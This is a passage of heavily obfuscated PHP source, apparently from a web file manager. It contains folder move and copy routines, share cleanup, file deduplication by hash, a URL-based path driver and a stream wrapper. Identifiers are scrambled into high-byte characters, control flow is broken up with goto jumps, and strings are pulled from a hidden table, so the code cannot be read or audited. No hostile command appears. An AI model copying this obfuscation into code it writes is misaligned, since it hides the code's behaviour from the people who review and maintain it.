$this->_moveForce($Bä¿ŠÔ‡éá, $AÚÑé£ÎÈ², $b„©íÂÊ÷•); } $B«àÄ—ˆä” = $e½¥¸·Ã°ñ; goto a»†Šˆ¹ä; a»†Šˆ¹ä: $e„¡ÏË¨éÆ = !1; if ($eÈ¶òÁŞ£ñ) { if ($FšÍ¢ò¹¸À == REPEAT_RENAME_FOLDER) { $b„©íÂÊ÷• = $this->fileNameAuto($AÚÑé£ÎÈ², $b„©íÂÊ÷•, $FšÍ¢ò¹¸À, $eÈ¶òÁŞ£ñ); $B«àÄ—ˆä” = $this->_moveForce($Bä¿ŠÔ‡éá, $AÚÑé£ÎÈ², $b„©íÂÊ÷•); } else { if ($FšÍ¢ò¹¸À == REPEAT_RENAME_FOLDER) { $FšÍ¢ò¹¸À = REPEAT_RENAME; } $Dœ‘¶‰•³ = $this->_childrenListSelect($Bä¿ŠÔ‡éá); foreach ($Dœ‘¶‰•³ as $e–›Î¾Ûâ) { $this->_move($e–›Î¾Ûâ[$C”—»µ´ï[374]], $e½¥¸·Ã°ñ, $FšÍ¢ò¹¸À, $a‹©é´‘Æ‰); } $e„¡ÏË¨éÆ = !0; } } else { if ($FšÍ¢ò¹¸À == REPEAT_SKIP) { $e„¡ÏË¨éÆ = !0; } else { if ($FšÍ¢ò¹¸À == REPEAT_RENAME || $FšÍ¢ò¹¸À == REPEAT_RENAME_FOLDER) { $b„©íÂÊ÷• = $this->fileNameAuto($AÚÑé£ÎÈ², $b„©íÂÊ÷•, $FšÍ¢ò¹¸À, $eÈ¶òÁŞ£ñ); $B«àÄ—ˆä” = $this->_moveForce($Bä¿ŠÔ‡éá, $AÚÑé£ÎÈ², $b„©íÂÊ÷•); } else { if ($FšÍ¢ò¹¸À == REPEAT_REPLACE) { $AÒÈï­É´† = $this->sourceInfoCache($e½¥¸·Ã°ñ); $CÊ‚ùôÂ…ä = $this->fileHistory($AÒÈï­É´†, $fÔó‹ä¦²É[$C”—»µ´ï[423]], $fÔó‹ä¦²É[$C”—»µ´ï[77]]); if ($CÊ‚ùôÂ…ä) { $a‹©é´‘Æ‰[$C”—»µ´ï[505]][] = $fÔó‹ä¦²É[$C”—»µ´ï[423]]; } else { $e„¡ÏË¨éÆ = !0; } } } } } if ($e„¡ÏË¨éÆ && !$a‹©é´‘Æ‰[$C”—»µ´ï[537]]) { $a‹©é´‘Æ‰[$C”—»µ´ï[537]] = !0; } goto c†Ø‰Å¡á; c†Ø‰Å¡á: return $B«àÄ—ˆä”; goto cäÒÔ¥†î; EÕß‡’‘†: $C”—»µ´ï =& $_SERVER[Ä¿Ş°¨]; $fÔó‹ä¦²É = $this->sourceInfo($Bä¿ŠÔ‡éá); $eÈ¶òÁŞ£ñ = $fÔó‹ä¦²É[$C”—»µ´ï[375]] == $C”—»µ´ï[83]; goto c‡İò¶¯¹ß; c‡İò¶¯¹ß: $b„©íÂÊ÷• = $D¼½ô‰×ÜŞ ? $D¼½ô‰×ÜŞ : $fÔó‹ä¦²É[$C”—»µ´ï[28]]; $e½¥¸·Ã°ñ = $this->fileNameExistCache($AÚÑé£ÎÈ², $b„©íÂÊ÷•); $this->lockMoveStart($Bä¿ŠÔ‡éá); goto F¥ÎÕİÍ; cäÒÔ¥†î: } private function _moveForce($D‡«ùÓ§ä¬, $F¸‰Ğ˜ã‰å, $E†ÃğÓÎŸ) { goto B‹Â´Ã°Ø¹; B‹Â´Ã°Ø¹: $F¦¦ºëÛØ =& $_SERVER[Ä¿Ş°¨]; $FÓØªÚ›ï½ = $this->sourceInfo($D‡«ùÓ§ä¬); $A¹¹‰Ä×ø‡ = $this->sourceInfo($F¸‰Ğ˜ã‰å); goto A›æÍäíŒˆ; föÑ“ø—ó: if (!$d»è·±ì•) { Model($F¦¦ºëÛØ[458])->authClear($D‡«ùÓ§ä¬); } $d˜¿ñÆ×îø = $FÓØªÚ›ï½[$F¦¦ºëÛØ[401]] == $F¦¦ºëÛØ[83] && $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[401]] != $F¦¦ºëÛØ[83]; if ($d˜¿ñÆ×îø) { $bœ™Œ°É„[$F¦¦ºëÛØ[400]] = 0; } goto DôêˆæŒÅ; A›æÍäíŒˆ: $b¤İíŸëƒ = $FÓØªÚ›ï½[$F¦¦ºëÛØ[375]] == $F¦¦ºëÛØ[83]; $bœ™Œ°É„ = array($F¦¦ºëÛØ[373] => $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[374]], $F¦¦ºëÛØ[529] => $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[463]] . $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[374]] . $F¦¦ºëÛØ[47], $F¦¦ºëÛØ[525] => $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[376]], $F¦¦ºëÛØ[526] => $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[460]], $F¦¦ºëÛØ[528] => USER_ID, $F¦¦ºëÛØ[391] => $E†ÃğÓÎŸ); $d»è·±ì• = $FÓØªÚ›ï½[$F¦¦ºëÛØ[376]] == SourceModel::TYPE_GROUP && $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[376]] == SourceModel::TYPE_GROUP && $FÓØªÚ›ï½[$F¦¦ºëÛØ[460]] == $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[460]]; goto föÑ“ø—ó; DôêˆæŒÅ: if ($b¤İíŸëƒ) { $D·ÖáÙªôË = array($F¦¦ºëÛØ[529] => array($F¦¦ºëÛØ[487], $FÓØªÚ›ï½[$F¦¦ºëÛØ[463]] . $FÓØªÚ›ï½[$F¦¦ºëÛØ[374]] . $F¦¦ºëÛØ[488])); $d®¬Õîİ‡À = $FÓØªÚ›ï½[$F¦¦ºëÛØ[463]] . $FÓØªÚ›ï½[$F¦¦ºëÛØ[374]] . $F¦¦ºëÛØ[47]; $dÀ×õƒå§å = $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[463]] . $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[374]] . $F¦¦ºëÛØ[47] . $FÓØªÚ›ï½[$F¦¦ºëÛØ[374]] . $F¦¦ºëÛØ[47]; $AˆÇÔ‰Ã»ğ = array($F¦¦ºëÛØ[529] => array($F¦¦ºëÛØ[538], "\162\145\160\x6c\x61\143\x65\50\160\x61\x72\x65\x6e\x74\x4c\x65\166\145\x6c\x2c\x27{$d®¬Õîİ‡À}\47\x2c\x27{$dÀ×õƒå§å}\47\51"), $F¦¦ºëÛØ[525] => $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[376]], $F¦¦ºëÛØ[526] => $A¹¹‰Ä×ø‡[$F¦¦ºëÛØ[460]]); if ($d˜¿ñÆ×îø) { $AˆÇÔ‰Ã»ğ[$F¦¦ºëÛØ[400]] = 0; } $this->where($D·ÖáÙªôË)->data($AˆÇÔ‰Ã»ğ)->save(); } $this->where(array($F¦¦ºëÛØ[388] => $D‡«ùÓ§ä¬))->data($bœ™Œ°É„)->save(); return $D‡«ùÓ§ä¬; goto dÉØ¯“˜; dÉØ¯“˜: } private function clearShare($F†³ÏçŞó, $E¡ùà˜¨ù) { goto f×•¯Â±¤ø; B†À¸²À»: Model($F¶Ÿ•Öï—[540])->where($b•±õŠë¥í)->save(array($F¶Ÿ•Öï—[452] => 0)); Model($F¶Ÿ•Öï—[541])->where($b•±õŠë¥í)->delete(); goto Eº…Á×ğºç; b¢½Ó‡§˜Œ: if ($aÙÁ¾˜Éà[$F¶Ÿ•Öï—[460]] == $Bˆƒˆ¡÷³ß[$F¶Ÿ•Öï—[460]] && $aÙÁ¾˜Éà[$F¶Ÿ•Öï—[376]] == $F¶Ÿ•Öï—[539]) { return; } $b•±õŠë¥í = array($F¶Ÿ•Öï—[463] => array($F¶Ÿ•Öï—[487], $aÙÁ¾˜Éà[$F¶Ÿ•Öï—[463]] . $F†³ÏçŞó . $F¶Ÿ•Öï—[488])); $bÛàÂ¨ÖÓ÷ = $this->field($F¶Ÿ•Öï—[388])->where($b•±õŠë¥í)->getField($F¶Ÿ•Öï—[374], !0); goto Aùè¡æŞ ; f×•¯Â±¤ø: $F¶Ÿ•Öï— =& $_SERVER[Ä¿Ş°¨]; $aÙÁ¾˜Éà = $this->sourceInfo($F†³ÏçŞó); $Bˆƒˆ¡÷³ß = $this->sourceInfo($E¡ùà˜¨ù); goto b¢½Ó‡§˜Œ; Aùè¡æŞ : if (!$bÛàÂ¨ÖÓ÷) { return; } $b•±õŠë¥í = array($F¶Ÿ•Öï—[374] => array($F¶Ÿ•Öï—[7], $bÛàÂ¨ÖÓ÷), $F¶Ÿ•Öï—[452] => 1); $e¨ƒÆ³…ÀÃ = Model($F¶Ÿ•Öï—[540])->field($F¶Ÿ•Öï—[445])->where($b•±õŠë¥í)->select(); goto e¸¢ñ”§è; e¸¢ñ”§è: if (!$e¨ƒÆ³…ÀÃ) { return; } $e¨ƒÆ³…ÀÃ = array_to_keyvalue($e¨ƒÆ³…ÀÃ, $F¶Ÿ•Öï—[33], $F¶Ÿ•Öï—[445]); $b•±õŠë¥í = array($F¶Ÿ•Öï—[445] => array($F¶Ÿ•Öï—[7], $e¨ƒÆ³…ÀÃ)); goto B†À¸²À»; Eº…Á×ğºç: } public function copyFolderFromIO($AàÛì‹¹à, $dèÜù‡­¤, $FïÌÒÊÊ˜ô, $C†½½­Óí£, $b©‡ğã¥öÔ, $d¸åÂ¬±Ûö = false) { goto F°‡¢Ë‹Á–; Eá’Ãåœ£: $E¹òîÑÑƒ = $this->fileNameExist($FïÌÒÊÊ˜ô, $dÉÇ‡Éî½å); $Cô£‰İ‘ÔÑ = $this->mkdir($FïÌÒÊÊ˜ô, $dÉÇ‡Éî½å, $C†½½­Óí£); if (!$E¹òîÑÑƒ || $C†½½­Óí£ == REPEAT_RENAME_FOLDER) { $C†½½­Óí£ = !1; } goto BÆ’ËÜ¿–²; Aº«­ĞÉÔÛ: Model($f«­Œ²±ñí[426])->linkAdd($DÁ±±¼ö‹Ñ[$f«­Œ²±ñí[505]]); Model($f«­Œ²±ñí[426])->remove($DÁ±±¼ö‹Ñ[$f«­Œ²±ñí[542]]); $this->folderSizeReset($FïÌÒÊÊ˜ô); goto BõâÃİ‹°æ; BõâÃİ‹°æ: $this->updateModifyTime($FïÌÒÊÊ˜ô); return $Cô£‰İ‘ÔÑ; goto C¬Œ…•¢ˆ; F°‡¢Ë‹Á–: $f«­Œ²±ñí =& $_SERVER[Ä¿Ş°¨]; $DÁ±±¼ö‹Ñ = array($f«­Œ²±ñí[506] => array(), $f«­Œ²±ñí[507] => array(), $f«­Œ²±ñí[505] => array(), $f«­Œ²±ñí[542] => array()); $dÉÇ‡Éî½å = $d¸åÂ¬±Ûö ? $d¸åÂ¬±Ûö : $AàÛì‹¹à->getPathName($AàÛì‹¹à->pathThis($dèÜù‡­¤)); goto Eá’Ãåœ£; a‰Ö×éñøí: Model($f«­Œ²±ñí[508])->addAll($DÁ±±¼ö‹Ñ[$f«­Œ²±ñí[506]], array(), !0); Model($f«­Œ²±ñí[509])->eventCopy($Cô£‰İ‘ÔÑ); $this->saveAll($DÁ±±¼ö‹Ñ[$f«­Œ²±ñí[507]]); goto Aº«­ĞÉÔÛ; AËºĞêÈŒ: Hook::trigger($f«­Œ²±ñí[544]); if ($Cô£‰İ‘ÔÑ) { $this->folderSizeResetChildren($Cô£‰İ‘ÔÑ); } $this->_childrenListClear(); goto a‰Ö×éñøí; BÆ’ËÜ¿–²: if ($E¹òîÑÑƒ) { $this->_childrenAllMake($E¹òîÑÑƒ); } Hook::trigger($f«­Œ²±ñí[543]); $this->_copyChildTo($AàÛì‹¹à, $dèÜù‡­¤, $Cô£‰İ‘ÔÑ, $C†½½­Óí£, $DÁ±±¼ö‹Ñ, $b©‡ğã¥öÔ); goto AËºĞêÈŒ; C¬Œ…•¢ˆ: } private function _copyChildTo($fõÊ†Á¶Ø, $dËÅìõ¡ä–, $d–Î×ÆÍù, $f†’æéÖŸ¾, &$c„Û¶èöòÃ, $bî›Ôğ˜¹†) { goto D¢Âöæ“°; CÕ±¦ÍÇ´ñ: $cÖé‚ã½¬Ø = array_merge($fàÕéãõ[$c¢ø¸°‰[73]], $fàÕéãõ[$c¢ø¸°‰[74]]); $CŞÍ²¾ïñŞ = $this->_addFiles($fõÊ†Á¶Ø, $fàÕéãõ[$c¢ø¸°‰[73]], $bî›Ôğ˜¹†); $D§õ¾êÙ† = array(); goto Aé„–çœ; Aé„–çœ: foreach ($cÖé‚ã½¬Ø as &$d¸âÅíø) { goto B–”ˆŸ†¦¤; B–”ˆŸ†¦¤: if (isset($CŞÍ²¾ïñŞ[$d¸âÅíø[$c¢ø¸°‰[28]]])) { $d¸âÅíø = $CŞÍ²¾ïñŞ[$d¸âÅíø[$c¢ø¸°‰[28]]]; } $d¸âÅíø[$c¢ø¸°‰[375]] = $d¸âÅíø[$c¢ø¸°‰[29]] == $c¢ø¸°‰[76]; $d¸âÅíø[$c¢ø¸°‰[377]] = _get($d¸âÅíø, $c¢ø¸°‰[156], $c¢ø¸°‰[33]); goto EğÔÅ£¹å‡; FØÃßÍ¥Ì: if ($f†’æéÖŸ¾) { $C‘‰£‡™Õ§ = $this->fileNameExistCache($d–Î×ÆÍù, $d¸âÅíø[$c¢ø¸°‰[28]]); if ($C‘‰£‡™Õ§) { if ($d¸âÅíø[$c¢ø¸°‰[375]] || $f†’æéÖŸ¾ == REPEAT_SKIP) { continue; } if ($f†’æéÖŸ¾ == REPEAT_REPLACE) { $Eé±á˜ïóÃ = $this->sourceInfoCache($C‘‰£‡™Õ§); $f‘ÄÔˆîÚß = $this->fileHistory($Eé±á˜ïóÃ, $d¸âÅíø[$c¢ø¸°‰[423]], $d¸âÅíø[$c¢ø¸°‰[77]]); if ($f‘ÄÔˆîÚß) { $c„Û¶èöòÃ[$c¢ø¸°‰[505]][] = $d¸âÅíø[$c¢ø¸°‰[423]]; } continue; } else { if ($f†’æéÖŸ¾ == REPEAT_RENAME) { $d¸âÅíø[$c¢ø¸°‰[28]] = $this->fileNameAutoCache($d–Î×ÆÍù, $d¸âÅíø[$c¢ø¸°‰[28]], $f†’æéÖŸ¾, !1); } } } } if (!$d¸âÅíø[$c¢ø¸°‰[375]] && $d¸âÅíø[$c¢ø¸°‰[423]]) { $c„Û¶èöòÃ[$c¢ø¸°‰[505]][] = $d¸âÅíø[$c¢ø¸°‰[423]]; } $D§õ¾êÙ†[] = $this->_makeItemData($d¸âÅíø, $B·¦ª§ìÙÃ, $d¸âÅíø[$c¢ø¸°‰[28]]); goto B¼£â…ªÂ¹; EğÔÅ£¹å‡: $d¸âÅíø[$c¢ø¸°‰[77]] = _get($d¸âÅíø, $c¢ø¸°‰[77], 0); $d¸âÅíø[$c¢ø¸°‰[423]] = _get($d¸âÅíø, $c¢ø¸°‰[423], 0); if (!isset($d¸âÅíø[$c¢ø¸°‰[545]]) && $d¸âÅíø[$c¢ø¸°‰[423]]) { $c„Û¶èöòÃ[$c¢ø¸°‰[542]][] = $d¸âÅíø[$c¢ø¸°‰[423]]; } goto FØÃßÍ¥Ì; B¼£â…ªÂ¹: } unset($d¸âÅíø); if (!empty($D§õ¾êÙ†)) { $this->addAll($D§õ¾êÙ†); } goto bÉ¨óÕù; D¢Âöæ“°: $c¢ø¸°‰ =& $_SERVER[Ä¿Ş°¨]; $B·¦ª§ìÙÃ = $this->sourceInfoCache($d–Î×ÆÍù); $fàÕéãõ = $fõÊ†Á¶Ø->listPath($dËÅìõ¡ä–, !1, !0); goto CÕ±¦ÍÇ´ñ; bÉ¨óÕù: $BÖÔÒÅã = $this->_childrenList($d–Î×ÆÍù); $BÖÔÒÅã = array_to_keyvalue($BÖÔÒÅã, $c¢ø¸°‰[28]); foreach ($cÖé‚ã½¬Ø as $d¸âÅíø) { $Eé±á˜ïóÃ = $BÖÔÒÅã[$d¸âÅíø[$c¢ø¸°‰[28]]]; $B¹°Äƒ¾Š– = $Eé±á˜ïóÃ[$c¢ø¸°‰[374]]; $this->_copyApplyMeta($Eé±á˜ïóÃ, $c„Û¶èöòÃ); if ($d¸âÅíø[$c¢ø¸°‰[29]] == $c¢ø¸°‰[76]) { $d¸âÅíø[$c¢ø¸°‰[75]] = $fõÊ†Á¶Ø->getPathInner($d¸âÅíø[$c¢ø¸°‰[75]]); $this->_copyChildTo($fõÊ†Á¶Ø, $d¸âÅíø[$c¢ø¸°‰[75]], $B¹°Äƒ¾Š–, $f†’æéÖŸ¾, $c„Û¶èöòÃ, $bî›Ôğ˜¹†); } } goto aƒ§óÕã÷ã; aƒ§óÕã÷ã: } private function _addFiles($aÕ¡šÎºåä, $fœ¨š­¼î–, $b×İñ×ñ¶) { goto Bß‡ê‹•¯; dİ¿Á¥‡é: $c§ŒÅ…È™ = $FÈç‰£->where($f‚ŸØ¹·)->select(); $c§ŒÅ…È™ = $c§ŒÅ…È™ ? $c§ŒÅ…È™ : array(); foreach ($c§ŒÅ…È™ as $BŠ¨¥¼é) { if (!isset($eßŠñœÇÈè[$BŠ¨¥¼é[$Eš¤©ØïÅæ[159]]])) { continue; } $a½Œ¼»‰»È = $eßŠñœÇÈè[$BŠ¨¥¼é[$Eš¤©ØïÅæ[159]]]; foreach ($a½Œ¼»‰»È as &$d ®„¥¡‹¥) { $d ®„¥¡‹¥[$Eš¤©ØïÅæ[423]] = $BŠ¨¥¼é[$Eš¤©ØïÅæ[423]]; $d ®„¥¡‹¥[$Eš¤©ØïÅæ[545]] = !0; } unset($d ®„¥¡‹¥); } goto A©†¼©‚; EÁìˆ±Í«³: foreach ($fœ¨š­¼î– as &$d ®„¥¡‹¥) { goto F¬Ó—ƒÈ¦ï; B¶İŠ—ãÇ: $EİŞæñÁº« = $aÕ¡šÎºåä->hashMd5($d ®„¥¡‹¥[$Eš¤©ØïÅæ[75]]); if (strlen($EİŞæñÁº«) > 10 && !isset($eßŠñœÇÈè[$EİŞæñÁº«])) { $eßŠñœÇÈè[$EİŞæñÁº«] = array(); } $d ®„¥¡‹¥[$Eš¤©ØïÅæ[160]] = $bëö×ªà; goto dò¹ä¢…ˆƒ; Bõç¡Ø¹Åö: if (count($eßŠñœÇÈè[$EİŞæñÁº«]) > 1) { $d ®„¥¡‹¥[$Eš¤©ØïÅæ[545]] = !0; } goto aƒóôœÚŠ; dò¹ä¢…ˆƒ: $d ®„¥¡‹¥[$Eš¤©ØïÅæ[159]] = $EİŞæñÁº«; Hook::trigger($Eš¤©ØïÅæ[547], $d ®„¥¡‹¥); $eßŠñœÇÈè[$EİŞæñÁº«][] =& $d ®„¥¡‹¥; goto Bõç¡Ø¹Åö; F¬Ó—ƒÈ¦ï: Hook::trigger($Eš¤©ØïÅæ[546], $d ®„¥¡‹¥); $d ®„¥¡‹¥[$Eš¤©ØïÅæ[75]] = $aÕ¡šÎºåä->getPathInner($d ®„¥¡‹¥[$Eš¤©ØïÅæ[75]]); $bëö×ªà = $aÕ¡šÎºåä->hashSimple($d ®„¥¡‹¥[$Eš¤©ØïÅæ[75]]); goto B¶İŠ—ãÇ; aƒóôœÚŠ: } $f‚ŸØ¹· = array($Eš¤©ØïÅæ[159] => array($Eš¤©ØïÅæ[7], array_keys($eßŠñœÇÈè))); $FÈç‰£ = Model($Eš¤©ØïÅæ[548]); goto dİ¿Á¥‡é; c¶Û™Î¾çÊ: foreach ($c§ŒÅ…È™ as $BŠ¨¥¼é) { if (!isset($eßŠñœÇÈè[$BŠ¨¥¼é[$Eš¤©ØïÅæ[159]]])) { continue; } $bôÜ—¼Î¿Å =& $eßŠñœÇÈè[$BŠ¨¥¼é[$Eš¤©ØïÅæ[159]]]; foreach ($bôÜ—¼Î¿Å as &$d ®„¥¡‹¥) { $d ®„¥¡‹¥[$Eš¤©ØïÅæ[423]] = $BŠ¨¥¼é[$Eš¤©ØïÅæ[423]]; } unset($d ®„¥¡‹¥); } $FçÑ¥ğ–µº = array(); foreach ($fœ¨š­¼î– as $bñÃ°ò¹Ø) { $FçÑ¥ğ–µº[$bñÃ°ò¹Ø[$Eš¤©ØïÅæ[28]]] = $bñÃ°ò¹Ø; } goto CáƒÜ®«Ó¨; A©†¼©‚: $C£”‘ò‚ˆÖ = array(); foreach ($fœ¨š­¼î– as $A¨Ùñ†Š†Â) { if (isset($A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[545]]) && $A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[545]]) { continue; } $a…Ç—ƒ‰° = $aÕ¡šÎºåä->getPathInner($A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[75]]); $eÍòòíÉï¾ = $FÈç‰£->addFileMake($a…Ç—ƒ‰°, $A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[77]], $A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[160]], $A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[159]], $A¨Ùñ†Š†Â[$Eš¤©ØïÅæ[28]], $b×İñ×ñ¶); $C£”‘ò‚ˆÖ[] = $eÍòòíÉï¾; } $FÈç‰£->addAll($C£”‘ò‚ˆÖ); goto FÍ£îÅ‹§Ò; FÍ£îÅ‹§Ò: $f‚ŸØ¹· = array($Eš¤©ØïÅæ[159] => array($Eš¤©ØïÅæ[7], array_keys($eßŠñœÇÈè))); $c§ŒÅ…È™ = $FÈç‰£->where($f‚ŸØ¹·)->select(); $c§ŒÅ…È™ = $c§ŒÅ…È™ ? $c§ŒÅ…È™ : array(); goto c¶Û™Î¾çÊ; Bß‡ê‹•¯: $Eš¤©ØïÅæ =& $_SERVER[Ä¿Ş°¨]; if (!$fœ¨š­¼î– || count($fœ¨š­¼î–) == 0) { return array(); } $eßŠñœÇÈè = array(); goto EÁìˆ±Í«³; CáƒÜ®«Ó¨: return $FçÑ¥ğ–µº; goto E‰ ‡×¨¼; E‰ ‡×¨¼: } } goto D—ùŠÒ–èÈ; e„ç“íè‚²: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($b—Ó„¨’•« = false) { } public function exist($D‡Ë…ªë¡«) { $Eİ‚„«™µÌ = $this->info($D‡Ë…ªë¡«); return $Eİ‚„«™µÌ[$_SERVER[Ä¿Ş°¨][184]]; } public function isFile($DÀ—ª¶ä½£) { $a–ìòœ¢›¸ = $this->info($DÀ—ª¶ä½£); return $a–ìòœ¢›¸[$_SERVER[Ä¿Ş°¨][184]]; } public function isFolder($d§ÆºãŒºÊ) { return !1; } public function size($a»÷™¦á¬«) { $c¬·ÓŞ¢‡ = $this->info($a»÷™¦á¬«); return $c¬·ÓŞ¢‡[$_SERVER[Ä¿Ş°¨][77]]; } public function info($b©äÅˆ’•°) { return $this->infoParse($b©äÅˆ’•°); } public function infoAuth($F„¶êİá¤) { return $this->infoParse($F„¶êİá¤); } public function infoWithChildren($DèÎ‰¹ùÌ¡) { return $this->infoParse($DèÎ‰¹ùÌ¡); } public function infoFull($eŠê´Æ‹³¤) { return $this->infoParse($eŠê´Æ‹³¤); } private function infoParse($DŒ©„Â›Ø¡) { $a‹µÓ™­À§ =& $_SERVER[Ä¿Ş°¨]; $E“Şæ‘õø† = $this->header($DŒ©„Â›Ø¡); if (!$E“Şæ‘õø† || !$E“Şæ‘õø†[$a‹µÓ™­À§[683]]) { return !1; } $e† ÏÎ‰Ê = _get($E“Şæ‘õø†, $a‹µÓ™­À§[321], 0); $Cƒ¹¤Ó‚æ† = array($a‹µÓ™­À§[28] => $E“Şæ‘õø†[$a‹µÓ™­À§[28]], $a‹µÓ™­À§[75] => $DŒ©„Â›Ø¡, $a‹µÓ™­À§[29] => $a‹µÓ™­À§[163], $a‹µÓ™­À§[77] => intval($e† ÏÎ‰Ê), $a‹µÓ™­À§[156] => get_path_ext($E“Şæ‘õø†[$a‹µÓ™­À§[28]]), $a‹µÓ™­À§[1139] => $e† ÏÎ‰Ê > 0 && $E“Şæ‘õø†[$a‹µÓ™­À§[1266]], $a‹µÓ™­À§[1140] => !1); return $Cƒ¹¤Ó‚æ†; } private function header($cïÛÖ˜ë×Á) { if (isset(self::$_cacheHeader[$cïÛÖ˜ë×Á])) { return self::$_cacheHeader[$cïÛÖ˜ë×Á]; } self::$_cacheHeader[$cïÛÖ˜ë×Á] = url_header($cïÛÖ˜ë×Á); return self::$_cacheHeader[$cïÛÖ˜ë×Á]; } public function hashSimple($AÄßºÉğ», $D…œ—†õ‚ = false) { goto DËÜ‚ÄÑ ; eÂ×é‰¿„ç: if ($d¯Öâğ¸„¥ <= $d±‰’ÈÄ“› * $D¬‘Ğèæ¿) { return md5($this->fileSubstr($AÄßºÉğ», 0, $d¯Öâğ¸„¥)) . $d¯Öâğ¸„¥; } $aã¾Œ…¦ = intval($d¯Öâğ¸„¥ / $D¬‘Ğèæ¿); $e¼ëàîâç° = $A†Ö±ÊšÁî[33]; goto a™Ìè›Â¥°; a™Ìè›Â¥°: $Aã“«ÒÁ = timeFloat(); $cÉ¸ß—´ˆÒ = 15; for ($B…ëêÃ‘Øé = 0; $B…ëêÃ‘Øé < $D¬‘Ğèæ¿; $B…ëêÃ‘Øé++) { if (timeFloat() - $Aã“«ÒÁ > $cÉ¸ß—´ˆÒ) { return !1; } $d¼¬¿ŒŸÍ = $this->fileSubstr($AÄßºÉğ», $aã¾Œ…¦ * $B…ëêÃ‘Øé, $d±‰’ÈÄ“›); if (!$d¼¬¿ŒŸÍ) { return !1; } $e¼ëàîâç° .= $d¼¬¿ŒŸÍ; } goto D·ù…öÕš; D·ù…öÕš: $e¼ëàîâç° .= $this->fileSubstr($AÄßºÉğ», $d¯Öâğ¸„¥ - $d±‰’ÈÄ“›, $d±‰’ÈÄ“›); return md5($e¼ëàîâç°) . $d¯Öâğ¸„¥; goto CÄ¸ß”÷ØÛ; Fƒ§í¼£¤á: $d¯Öâğ¸„¥ = $eÉÔã‡¸Š«[$A†Ö±ÊšÁî[77]]; $d±‰’ÈÄ“› = 200; $D¬‘Ğèæ¿ = 50; goto eÂ×é‰¿„ç; DËÜ‚ÄÑ : $A†Ö±ÊšÁî =& $_SERVER[Ä¿Ş°¨]; $eÉÔã‡¸Š« = $this->info($AÄßºÉğ»); if (!$eÉÔã‡¸Š« || !$eÉÔã‡¸Š«[$A†Ö±ÊšÁî[184]]) { return !1; } goto Fƒ§í¼£¤á; CÄ¸ß”÷ØÛ: } public function getContent($B¢ãÌÇ­—Ä) { return $this->fileSubstr($B¢ãÌÇ­—Ä); } public function fileSubstr($eì‹ó¬«®ç, $F•ÜÑ‹‹ñ„ = 0, $eİáªá®ñ– = -1) { goto a‡ßáÄ»—®; a‡ßáÄ»—®: $FÚ–Š°ğ³Æ =& $_SERVER[Ä¿Ş°¨]; $e·Á²İÊ° = $this->info($eì‹ó¬«®ç); if (!$e·Á²İÊ° || !$e·Á²İÊ°[$FÚ–Š°ğ³Æ[184]] && $e·Á²İÊ°[$FÚ–Š°ğ³Æ[77]] > 1024 * 1024 * 10) { return !1; } goto dƒêâ‘‘; FË¾¾£ñô±: $E«·¥ØøÆÌ = url_request($eì‹ó¬«®ç, $FÚ–Š°ğ³Æ[212], !1, $D¸ó‰‡™‹÷, !1, !1, 1); return $E«·¥ØøÆÌ[$FÚ–Š°ğ³Æ[1019]] ? $E«·¥ØøÆÌ[$FÚ–Š°ğ³Æ[1019]] : $FÚ–Š°ğ³Æ[33]; goto FŒà÷¾ “†; dƒêâ‘‘: if ($eİáªá®ñ– === -1) { $eİáªá®ñ– = $e·Á²İÊ°[$FÚ–Š°ğ³Æ[77]]; } if ($eİáªá®ñ– == 0) { return $FÚ–Š°ğ³Æ[33]; } $D¸ó‰‡™‹÷ = array($FÚ–Š°ğ³Æ[1267] . $F•ÜÑ‹‹ñ„ . $FÚ–Š°ğ³Æ[708] . ($F•ÜÑ‹‹ñ„ + $eİáªá®ñ– - 1)); goto FË¾¾£ñô±; FŒà÷¾ “†: } public function download($EÃ›Ò§É°, $d½“†îÀÕ“) { Downloader::start($EÃ›Ò§É°, $d½“†îÀÕ“); return $d½“†îÀÕ“; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eèåË¿¸Ôá, $a…‚õº÷½¸ = '') { goto B¼­íáÅÛà; d¸”­÷ç¸¦: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$eèåË¿¸Ôá])) { self::$_chunkBuffer[$eèåË¿¸Ôá] = array(); } goto f×ÇÂå‡Ë; B¼­íáÅÛà: $this->info = $this->info($eèåË¿¸Ôá); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ä¿Ş°¨][75]]; goto d¸”­÷ç¸¦; f×ÇÂå‡Ë: return $this->info ? !0 : !1; goto D‡ŒÂ©ù‚; D‡ŒÂ©ù‚: } function stream_read($bÉ¥…ö“ë¹) { $EŞÔìÒÂß¹ = $this->fileSubstr($this->pose, $bÉ¥…ö“ë¹); $this->pose += strlen($EŞÔìÒÂß¹); return $EŞÔìÒÂß¹; } public function stream_tell() { return $this->pose; } public function stream_seek($CÀ±„ŠæÂé, $D´ŠÕŠÈ¿) { $Aˆ°¤‡àÊ =& $_SERVER[Ä¿Ş°¨]; if ($D´ŠÕŠÈ¿ == SEEK_SET) { $this->pose = $CÀ±„ŠæÂé; } else { if ($D´ŠÕŠÈ¿ == SEEK_CUR) { $this->pose += $CÀ±„ŠæÂé; } else { if ($D´ŠÕŠÈ¿ == SEEK_END) { $this->pose = $this->info[$Aˆ°¤‡àÊ[77]] + intval($CÀ±„ŠæÂé); } } } if ($CÀ±„ŠæÂé < 0) { $this->pose = $this->info[$Aˆ°¤‡àÊ[77]] + $CÀ±„ŠæÂé; } return !0; } public function 